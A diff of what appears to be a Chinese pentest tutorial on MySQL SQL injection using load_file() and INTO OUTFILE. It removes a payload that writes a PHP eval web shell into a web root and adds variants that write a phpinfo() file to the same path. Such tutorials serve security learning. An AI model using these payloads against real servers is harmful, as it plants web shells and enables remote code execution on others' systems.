@@ -7,6 +7,12 @@ title = "SQL注入之load_file和into outfile(MySQL)"
 topics = ["Pentest"]
 
 +++
+<!--
+ * @Author: reber
+ * @Mail: reber0ask@qq.com
+ * @Date: 2019-04-10 10:45:00
+ * @LastEditTime: 2019-08-15 15:19:43
+ -->
 
 ### 0x00 load_file()
 * 条件:
@@ -47,7 +53,13 @@ topics = ["Pentest"]
 ```
 
 * 一般方法  
-当知道路径时，可以直接用?id=1 union select "<?php @eval($_POST['c']);?>" into outfile("C:/phpStudy/WWW/a.php")
+当知道路径时，可以直接用
+
+```id=1 union select "<? phpinfo();>" into outfile("C:/phpStudy/WWW/a.php")```
+
+或者
+
+```id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '<? phpinfo();>';```
 
 * 其他方法 
     * 登陆phpMyAdmin  
